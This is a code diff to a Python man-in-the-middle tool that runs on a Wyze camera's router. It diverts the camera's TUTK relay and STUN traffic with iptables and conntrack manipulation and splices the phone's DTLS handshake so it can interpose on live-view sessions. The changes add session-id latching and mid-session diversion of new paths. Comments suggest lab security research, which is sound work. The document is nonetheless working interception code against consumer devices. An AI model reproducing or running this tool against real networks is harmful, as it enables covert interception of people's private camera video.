@@ -27,6 +27,7 @@ How the session is caught (this host is the camera's router, onpath.py):
    flows back to the kernel, and re-watch for the app's next attempt.
 """
 import hashlib
+import ipaddress
 import select
 import socket
 import struct
@@ -115,7 +116,7 @@ def divert_specs(us, cam_ip, cam_port, peers):
     return specs
 
 
-def install_splice_rules(changes, us, cam_ip, cam_port, peers):
+def install_splice_rules(changes, us, cam_ip, cam_port, peers, quiet=False):
     """Divert the camera's packets toward each peer (relay ip, port) to
     the splice, in ONE iptables-restore spawn (install speed matters
     inside the handshake window), and open an INPUT hole for the peers'
@@ -139,8 +140,9 @@ def install_splice_rules(changes, us, cam_ip, cam_port, peers):
         print("[!] iptables-restore failed:", res.stderr.strip())
         changes.undo(tokens)     # a table may have committed before the error
         return None
-    print(f"[+] divert armed: {cam_ip}:{cam_port} -> "
-          + ", ".join(f"{p[0]}:{p[1]}" for p in peers))
+    if not quiet:
+        print(f"[+] divert armed: {cam_ip}:{cam_port} -> "
+              + ", ".join(f"{p[0]}:{p[1]}" for p in peers))
     return tokens
 
 
@@ -266,12 +268,15 @@ class RelayFlowWatcher:
         self.extra_paths = []     # STUN-relay :3478 tuples to divert too
         self.n_from_cam = self.n_to_cam = 0   # forwarding health
         self._warned = False
+        self.sid = None           # TUTK session id of the latched session
+        self.sids_seen = {}       # session id -> first seen (SID_TTL)
 
-    def _latch(self, ip, port, cam_port, how):
+    def _latch(self, ip, port, cam_port, how, sid=None):
         """Arm on (ip, port). Every latch records the tuple as tried so
         post-teardown relatches skip it: the app retries on a NEW relay
         port, and dead flows retransmit for tens of seconds."""
         self.relay_ip, self.relay_port = ip, port
+        self.sid = sid
         self.cam_port = cam_port
         now = time.time()
         self.extra_paths = sorted(
@@ -339,6 +344,26 @@ class RelayFlowWatcher:
         if o1 in (10, 127) or o1 >= 224:
             return
         key = (dst, pkt.dport)
+        cmd0 = (wrap_cmd(payload)
+                if len(payload) >= 24 and payload[:2] == b"\x51\xcc" else 0)
+        # SESSION-START LATCH (primary): a live view begins with the
+        # camera's 0x1102 channel-opens carrying the new TUTK session id,
+        # sent to every candidate path (P2P addresses, a data relay) about
+        # 150 ms before the phone's first ClientHello (live 2026-11-04).
+        # Arming here diverts the camera's STUN-relay paths and this
+        # destination before that ClientHello can reach the camera; paths
+        # the session opens later are added while it runs.
+        if self.relay_port is None and cmd0 == CMD_CHANNEL_OPEN:
+            sid = payload[16:24]
+            now = time.time()
+            for k in [k for k, t in self.sids_seen.items() if now - t > TRIED_TTL]:
+                del self.sids_seen[k]
+            if sid not in self.sids_seen and sid != bytes(8):
+                self.sids_seen[sid] = now
+                self.seen.setdefault(key, [now, 0])
+                self.last_seen[key] = now
+                self._latch(key[0], key[1], pkt.sport, "session start", sid)
+                return
         c = self.seen.get(key)
         if c is None:
             c = self.seen[key] = [time.time(), 0]
@@ -407,6 +432,29 @@ class RelayFlowWatcher:
                 time.sleep(5)
         return self.found.is_set()
 
+    def learn_paths(self, timeout=30):
+        """Sniff until the camera's STUN-relay (:3478) paths are known:
+        they are diverted the moment a session starts, and a ClientHello
+        can arrive on any of them. The camera refreshes them every few
+        seconds."""
+        if any(k[1] == STUN_RELAY_PORT for k in self.last_seen):
+            return True
+        print("[*] learning the camera's relay paths...")
+        prog = rawnet.udp_filter([self.target], [self.masq_ip])
+        deadline = time.time() + timeout
+
+        def known():
+            return (self.found.is_set()
+                    or any(k[1] == STUN_RELAY_PORT for k in self.last_seen))
+        while not known() and time.time() < deadline:
+            try:
+                rawnet.sniff(iface_for(self.target), prog, rawnet.parse_udp,
+                             self._cb, known,
+                             timeout=max(1, deadline - time.time()))
+            except OSError:
+                time.sleep(1)
+        return known()
+
     def _health(self):
         """Warn once if the camera talks but nothing comes back to it
         through us: something on this host drops forwarded traffic."""
@@ -423,7 +471,14 @@ class RelayFlowWatcher:
         self.relay_ip = self.relay_port = self.cam_port = None
 
 
-def _relatch_reason(engine, latch_time, last_packet, now, last_cam=None):
+# a session-start latch arms before the app has picked a path: it may try
+# P2P for seconds before its ClientHello comes over a relay
+CH_WAIT_SESSION_START = 20
+CH_WAIT = 5
+
+
+def _relatch_reason(engine, latch_time, last_packet, now, last_cam=None,
+                    ch_wait=CH_WAIT):
     """Why the armed session should be abandoned, or None to keep it.
 
     Live timing: an attempt can stall at the camera (HVR answered,
@@ -443,8 +498,8 @@ def _relatch_reason(engine, latch_time, last_packet, now, last_cam=None):
             return "pass-through: session quiet 30s"
         return None
     if not engine.started:
-        if now - latch_time > 5:
-            return "stale latch (no phone CH within 5s)"
+        if now - latch_time > ch_wait:
+            return f"stale latch (no phone CH within {ch_wait}s)"
         return None
     if engine.failed:
         # from latch_time, not last_packet: a failed engine's tuple may
@@ -462,6 +517,107 @@ def _relatch_reason(engine, latch_time, last_packet, now, last_cam=None):
     if now - last_packet > 30:
         return "session quiet 30s"
     return None
+
+
+class SessionObserver:
+    """Sniffs the camera's UDP while a session is diverted, in a thread:
+    reports paths the session opens after the divert (the camera's 0x1102
+    channel-opens to public tuples not yet diverted, e.g. a data relay
+    chosen after the session started on the STUN relays, and STUN relays
+    it starts using), and the session
+    ids of ClientHellos that reached the camera on a path not diverted."""
+
+    def __init__(self, target, us, cam_port, paths):
+        self.target, self.us, self.cam_port = target, us, cam_port
+        self.paths = frozenset(paths)
+        self._new, self._leaks = [], []
+        self._lock = threading.Lock()
+        # the splice loop select()s on wake_r, so a new path is added at
+        # once, not at its next 0.25 s tick
+        self.wake_r, self._wake_w = socket.socketpair()
+        self.wake_r.setblocking(False)
+        self._stop = threading.Event()
+        self._thread = None
+
+    def start(self):
+        prog = rawnet.udp_filter([self.target], [self.us])
+
+        def loop():
+            while not self._stop.is_set():
+                try:
+                    rawnet.sniff(iface_for(self.target), prog,
+                                 rawnet.parse_udp, self._cb, self._stop.is_set)
+                except OSError:
+                    self._stop.wait(1)
+        self._thread = threading.Thread(target=loop, daemon=True)
+        self._thread.start()
+
+    def stop(self):
+        self._stop.set()
+        if self._thread:
+            self._thread.join(1)
+        self.wake_r.close()
+        self._wake_w.close()
+
+    def _wake(self):
+        try:
+            self._wake_w.send(b"x")
+        except OSError:
+            pass
+
+    def _cb(self, pkt):
+        p = pkt.payload
+        if len(p) < 24 or p[:2] != b"\x51\xcc":
+            return
+        if pkt.src == self.target and pkt.sport == self.cam_port:
+            peer = (pkt.dst, pkt.dport)
+            # a channel-open to a new tuple, or any traffic to a STUN relay
+            # (:3478) the session is not using yet: the ClientHello can
+            # arrive on either
+            if (peer not in self.paths and _is_public(pkt.dst)
+                    and (wrap_cmd(p) == CMD_CHANNEL_OPEN
+                         or pkt.dport == STUN_RELAY_PORT)):
+                with self._lock:
+                    if peer not in self._new:
+                        self._new.append(peer)
+                self._wake()
+        elif (pkt.dport == self.cam_port and pkt.dst in (self.target, self.us)
+              and (pkt.src, pkt.sport) not in self.paths
+              and is_plain_clienthello(p)):
+            with self._lock:
+                self._leaks.append(p[16:24])
+            self._wake()
+
+    def take_new_paths(self):
+        try:
+            while self.wake_r.recv(64):
+                pass
+        except OSError:
+            pass
+        with self._lock:
+            out, self._new = self._new, []
+        return out
+
+    def take_leaks(self):
+        with self._lock:
+            out, self._leaks = self._leaks, []
+        return out
+
+
+_NOT_PUBLIC = [ipaddress.ip_network(n) for n in (
+    "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8",
+    "169.254.0.0/16", "172.16.0.0/12", "192.168.0.0/16", "224.0.0.0/3")]
+
+
+def _is_public(ip):
+    """Reachable beyond the LAN: not RFC 1918, CGNAT, loopback, link-local
+    or multicast. (Documentation ranges count as public: the lab uses
+    them as the internet.)"""
+    try:
+        a = ipaddress.IPv4Address(ip)
+    except ValueError:
+        return False
+    return not any(a in n for n in _NOT_PUBLIC)
 
 
 class Splicer:
@@ -558,6 +714,7 @@ class Splicer:
         self.enr = enr
         self.out.mkdir(parents=True, exist_ok=True)
         self.log = open(self.out / "interpose.log", "ab", buffering=0)
+        self.watcher.learn_paths()
         print(f"[*] watching {self.target} for a live-view session: "
               f"open the camera's live view in the Wyze app")
         try:
@@ -577,51 +734,71 @@ class Splicer:
         """Divert and splice one latched attempt; returns why it ended."""
         w = self.watcher
         cam_port = w.cam_port
-        cam_addr = (self.target, cam_port)
         relay_addr = (w.relay_ip, w.relay_port)
-        # every relay path the session may use: the data relay it latched
-        # on plus the camera's live STUN-relay :3478 flows
+        # every relay path the session may use: the one it latched on plus
+        # the camera's live STUN-relay :3478 flows; more are added while
+        # it runs (add_path)
         peers = [relay_addr] + [p for p in w.extra_paths if p != relay_addr]
-        # sockets first, rules second: the first diverted packet must find
-        # its reader
-        paths = []
-        tokens = None
+        self._cam_port = cam_port
+        self._paths, self._tokens, self._skipped = [], [], []
         try:
-            try:
-                for peer in peers:
-                    cf, rf = open_faces(cam_addr, peer, self.us)
-                    paths.append({"peer": peer, "cam_face": cf,
-                                  "relay_face": rf})
-            except OSError as e:
-                return f"could not open sockets ({e!r})"
-            tokens = install_splice_rules(self.changes, self.us, self.target,
-                                          cam_port, peers)
-            if tokens is None:
-                return "rule install failed"
-            # hand each flow's NAT address from the kernel to our
-            # relay-side socket: until its conntrack entry is gone, the
-            # relay's replies are de-NATed to the camera instead of
-            # reaching relay_face
-            for pip, pport in peers:
-                conntrack_delete(self.target, cam_port, pip, pport)
-            return self._splice(paths)
+            for peer in peers:
+                err = self._add_path(peer, announce=False)
+                if err:
+                    # one unusable candidate (e.g. a P2P address that maps
+                    # back to a socket on this host) must not sink the rest
+                    print(f"[!] not diverting {peer[0]}:{peer[1]}: {err}")
+                    self._skipped.append(peer)
+            if not self._paths:
+                return "no path could be diverted"
+            print(f"[+] divert armed: {self.target}:{cam_port} -> "
+                  + ", ".join(f"{p['peer'][0]}:{p['peer'][1]}"
+                              for p in self._paths))
+            return self._splice(self._paths)
         finally:
             with signals_held():
-                if tokens:
-                    self.changes.undo(tokens)
-                for pth in paths:
+                if self._tokens:
+                    self.changes.undo(self._tokens)
+                for pth in self._paths:
                     pth["cam_face"].close()
                     pth["relay_face"].close()
-                if tokens:
-                    # give the flows back to the kernel: the camera's next
-                    # packet gets a fresh NAT entry on the same port, so
-                    # the relays keep seeing the same public address
-                    for pip, pport in peers:
-                        for src in (self.us, self.target):
-                            conntrack_delete(src, cam_port, pip, pport)
-                        conntrack_delete(pip, pport, self.us, cam_port)
+                # give the flows back to the kernel: the camera's next
+                # packet gets a fresh NAT entry on the same port, so the
+                # relays keep seeing the same public address
+                for pth in self._paths:
+                    pip, pport = pth["peer"]
+                    for src in (self.us, self.target):
+                        conntrack_delete(src, cam_port, pip, pport)
+                    conntrack_delete(pip, pport, self.us, cam_port)
+                if self._paths:
                     self.stats["storm_dropped"] = self.storm_guard.dropped
                     print(f"[+] divert removed. stats: {self.stats}")
+                self._paths, self._tokens = [], []
+
+    def _add_path(self, peer, announce=True):
+        """Divert one more of the camera's paths: sockets first, then the
+        rule, then hand its NAT entry to our relay-side socket (until the
+        entry is gone, the relay's replies are de-NATed to the camera
+        instead of reaching relay_face). Returns an error string or None."""
+        cam_addr = (self.target, self._cam_port)
+        try:
+            cf, rf = open_faces(cam_addr, peer, self.us)
+        except OSError as e:
+            return f"could not open its sockets ({e.strerror})"
+        tokens = install_splice_rules(self.changes, self.us, self.target,
+                                      self._cam_port, [peer], quiet=True)
+        if tokens is None:
+            cf.close()
+            rf.close()
+            return "rule install failed"
+        pth = {"peer": peer, "cam_face": cf, "relay_face": rf}
+        self._paths.append(pth)
+        self._tokens += tokens
+        conntrack_delete(self.target, self._cam_port, peer[0], peer[1])
+        if announce:
+            print(f"[+] divert extended: {self.target}:{self._cam_port} -> "
+                  f"{peer[0]}:{peer[1]}")
+        return None
 
     def _splice(self, paths):
         engine = self._new_engine()
@@ -659,18 +836,26 @@ class Splicer:
         # packets to the camera mirror the relay side's arrival TTL;
         # packets to the relay mirror the camera's (64 -> 63)
         face_of = {}
-        for pth in paths:
+
+        def register(pth):
             pth["to_cam_ttl"] = TtlMirror(pth["cam_face"])
             pth["to_relay_ttl"] = TtlMirror(pth["relay_face"])
             pth["to_relay_ttl"].follow(64)
             face_of[pth["cam_face"]] = (pth, "cam")
             face_of[pth["relay_face"]] = (pth, "relay")
+        for pth in paths:
+            register(pth)
         data_path = paths[0]
+        observer = SessionObserver(self.target, self.us, self._cam_port,
+                                   {p["peer"] for p in paths}
+                                   | set(self._skipped))
+        observer.start()
         # which path last carried each wrapper type, per side: an engine
         # emission goes out on the path its (reused) wrapper belongs to,
         # so 0x1402 flights travel via the STUN relay the peer used and
         # 0x1502 via the data relay
         phone_path_for, cam_path_for = {}, {}
+        leaked = set()
 
         def deliver(to_cam, to_phone):
             for w_ in to_cam:
@@ -685,8 +870,25 @@ class Splicer:
         spliced = False
         try:
             while True:
-                ready, _, _ = select.select(list(face_of) + [self.sock],
-                                            [], [], 0.25)
+                # paths the session opened since the divert, and attempts
+                # whose ClientHello reached the camera before it
+                for peer in observer.take_new_paths():
+                    err = self._add_path(peer)
+                    if err is None:
+                        register(self._paths[-1])
+                    else:
+                        print(f"[!] not diverting {peer[0]}:{peer[1]}: {err}")
+                    # tried either way: report each path once
+                    observer.paths = observer.paths | {peer}
+                for sid in observer.take_leaks():
+                    if engine and engine.started and engine.session_key == sid:
+                        continue
+                    print("[!] a ClientHello reached the camera before the "
+                          "divert; leaving that attempt alone (the app's "
+                          "retry is caught instead)")
+                    leaked.add(sid)
+                ready, _, _ = select.select(
+                    list(face_of) + [self.sock, observer.wake_r], [], [], 0.25)
                 now = time.time()
                 if engine and not engine.failed:
                     deliver(*engine.tick(now))
@@ -695,6 +897,8 @@ class Splicer:
                     stats["storm_dropped"] = storm_guard.dropped
                     print(f"[*] stats: {stats}")
                 for face in ready:
+                    if face is observer.wake_r:
+                        continue      # handled at the top of the loop
                     while True:   # drain everything queued on this face
                         try:
                             if face is self.sock:
@@ -752,8 +956,14 @@ class Splicer:
                             if (engine and not engine.failed and dtls
                                     and (session_key(data) == engine.session_key
                                          if engine.started
-                                         else is_clienthello_flight(data))):
+                                         else (is_clienthello_flight(data)
+                                               and session_key(data)
+                                               not in leaked))):
+                                was_started = engine.started
                                 deliver(*engine.on_phone_packet(data))
+                                if engine.started and not was_started:
+                                    # the handshake clocks start at the CH
+                                    latch_time = time.time()
                                 if engine.failed:
                                     tx(pth["cam_face"], data, "to_cam")
                             elif storm_guard.allow(pth["peer"], data):
@@ -767,12 +977,15 @@ class Splicer:
                     engine, latch_time, last_packet, time.time(),
                     last_cam if (engine is None
                                  or engine.client_leg.handshake_done)
-                    else None)
+                    else None,
+                    ch_wait=(CH_WAIT_SESSION_START if self.watcher.sid
+                             else CH_WAIT))
                 if reason:
                     return reason
         except KeyboardInterrupt:
             return "interrupted"
         finally:
+            observer.stop()
             if spliced:
                 self.spliced_sessions += 1
             if engine:
